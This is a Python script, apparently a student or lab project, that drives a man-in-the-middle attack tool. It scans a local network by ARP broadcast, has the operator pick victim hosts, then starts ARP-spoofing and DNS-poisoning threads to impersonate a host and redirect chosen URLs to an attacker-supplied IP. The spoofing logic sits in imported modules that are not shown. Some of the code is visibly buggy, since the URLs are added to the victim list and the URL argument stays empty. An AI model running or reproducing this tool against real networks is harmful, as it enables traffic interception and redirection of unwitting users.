import sys
import threading
from scapy.all import *
from ArpSpoofing import ArpSpoofing
from DnsPoisoning import DnsPoisoning
import signal

if __name__ == "__main__":
    #global variables
    arguments = sys.argv
    #argReq = 6
    interface = "enp0s3"
    arpSpoof = None
    dnsPoison = None
    hostToAttack = []
    hostToSpoof = None
    ipToSendTo = None
    url = None

    #Takes the command like argument and stores it
    modeOfAttack = arguments[1]
    timeSleep = float(arguments[2])

    booleanScan = raw_input("Do you want to scan the network for IPs? Enter yes for scanning enter no for not scanning. ")
    if booleanScan == "yes":
        ips = raw_input("Enter range of IPs to scan for: (e.g 192.168.56.0/24) ")
        conf.verb = 0
        ans, unans = srp(Ether(dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst = ips), timeout = 2, iface=interface, inter=0.1)
        counter = 0
        ipList = []
        macList = []
        for snt, recv in ans:
            print("index: {} IP: {} MAC: {}".format(counter,recv[ARP].psrc, recv[ARP].hwsrc))
            ipList.append(recv[ARP].psrc)
            macList.append(recv[ARP].hwsrc)
            counter += 1
        index = ""
        while index != "no":
            index = raw_input("Enter the index of the ip you want to add to be attack IPs or no if you are done adding IPs. ")
            if index != "no":
                intIndex = int(index)
                hostToAttack.append(ipList[intIndex])
                index = raw_input("IP added, do you want to select more IP addresses? Write yes or no. ")

    if modeOfAttack == "arp":
        nextOneAttack = raw_input("Do you want to manually add IP address to the to be attack IPs? Type yes or no ")
        while nextOneAttack == "yes":
            attackIp = raw_input("Please enter ip address to attack: ")
            nextOneAttack = raw_input("If you want to enter another IP address to attack type yes, otherwise type no. ")
            hostToAttack.append(attackIp)
        spoofIp = raw_input("Please enter ip address to spoof: ")
        hostToSpoof = spoofIp
    elif modeOfAttack == "dns":
        nextOneAttack = raw_input("Do you want to manually add IP address to the to be attack IPs? Type yes or no ")
        while nextOneAttack == "yes":
            attackIp = raw_input("Please enter ip address to attack: ")
            nextOneAttack = raw_input("If you want to enter another IP address to attack type yes, otherwise type no. ")
            hostToAttack.append(attackIp)
        ipSendTo = raw_input("Please enter ip address to which the URL must go to: ")
        ipToSendTo = ipSendTo
        urlNext = "yes"
        while urlNext == "yes":
            newUrl = raw_input("Please enter the URL you want to DNS spoof: ")
            urlNext = raw_input("If you want to enter another URL to DNS spoof type yes, otherwise type no. ")
            hostToAttack.append(newUrl)
    elif modeOfAttack == "all":
        nextOneAttack = raw_input("Do you want to manually add IP address to the to be attack IPs? Type yes or no ")
        while nextOneAttack == "yes":
            attackIp = raw_input("Please enter ip address to attack: ")
            nextOneAttack = raw_input("If you want to enter another IP address to attack type yes, otherwise type no. ")
            hostToAttack.append(attackIp)
        spoofIp = raw_input("Please enter ip address to spoof: ")
        hostToSpoof = spoofIp
        ipSendTo = raw_input("Please enter ip address to which the URL must go to: ")
        ipToSendTo = ipSendTo
        urlNext = "yes"
        while urlNext == "yes":
            newUrl = raw_input("Please enter the URL you want to DNS spoof: ")
            urlNext = raw_input("If you want to enter another URL to DNS spoof type yes, otherwise type no. ")
            hostToAttack.append(newUrl)
    else:
        print("Wrong mode of attack provided choose out of: arp, dns or all")
        sys.exit(1)

    if len(hostToAttack) == 0:
        print("You did not add any IP addresses to attack, exiting...")
        sys.exit(1)

    if modeOfAttack == "arp":
        arpSpoofing = ArpSpoofing(interface)
        try:
            print("before thread")
            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(hostToAttack, hostToSpoof, timeSleep))
            arpSpoof.daemon = True
            arpSpoof.start()
            print("after thread")
        except:
            print("Thread arp failed to start")
    elif modeOfAttack == "dns":
        dnsPoisoning = DnsPoisoning(interface)
        try:
            dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison, args=(hostToAttack, url, ipToSendTo, timeSleep))
            dnsPoison.daemon = True
            dnsPoison.start()
        except:
            print("Thread dns failed to start")

    elif modeOfAttack == "all":
        arpSpoofing = ArpSpoofing(interface)
        dnsPoisoning = DnsPoisoning(interface)
        try:
            arpSpoof = threading.Thread(name="arpThread", target=arpSpoofing.doSpoof, args=(hostToAttack, hostToSpoof, timeSleep))
            arpSpoof.daemon = True
            arpSpoof.start()
            print("one thread created")
            dnsPoison = threading.Thread(name="dnsThread", target=dnsPoisoning.doPoison, args=(hostToAttack, url, ipToSendTo, timeSleep))
            dnsPoison.daemon = True
            dnsPoison.start()
        except:
            print("Thread arp & dns failed to start")

    else:
        print("Wrong mode of attack provided choose out of: arp, dns or all")
        sys.exit(1)

    if modeOfAttack == "arp":
        arpSpoof.join()
    elif modeOfAttack == "dns":
        dnsPoison.join()
    elif modeOfAttack == "all":
        arpSpoof.join()
        dnsPoison.join()

    print("reached end of the main file")
